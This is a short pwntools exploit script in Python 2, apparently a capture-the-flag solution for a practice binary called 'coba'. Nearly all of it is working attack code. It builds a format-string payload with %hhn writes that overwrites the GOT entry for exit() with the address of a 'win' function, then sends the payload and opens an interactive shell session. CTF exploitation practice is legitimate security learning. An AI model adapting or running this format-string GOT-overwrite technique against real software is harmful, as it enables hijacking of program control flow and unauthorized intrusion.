from pwn import *
import sys
from LibcSearcher import LibcSearcher


#MyTemplate
program = 'coba'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''
context.clear(arch = 'amd64')

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False

uu64 = lambda x: u64(x.ljust(8,"\x00"))
uu32 = lambda x: u32(x.ljust(4,"\x00"))

if lokal:
    s = elf.process()
    #libc = elf.libc
else:
    host = ''
    port = ''
    s = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    cmd = ""
    gdb.attach(s,cmd)

#Exploit Here
exitgot = elf.got['exit']
win = elf.symbols['win']
print hex(win)
target = win

p = ""
p += "%{}c".format(((target) & 0xFF) + 0x100)
p += "%14$hhn"
p += "%{}c".format(((target >> 8) & 0xFF) + 0x100 - ((target) & 0xFF))
p += "%15$hhn"
p += "%{}c".format(((target >> 16) & 0xFF) + 0x100 - ((target >> 8) & 0xFF))
p += "%16$hhn"
p += "%{}c".format(((target >> 24) & 0xFF) + 0x100 - ((target >> 16) & 0xFF))
p += "%17$hhn"

p = p.ljust(64,"A")
p += p64(exitgot)
p += p64(exitgot+1)
p += p64(exitgot+2)
p += p64(exitgot+3)

s.sendline(p)

s.interactive()
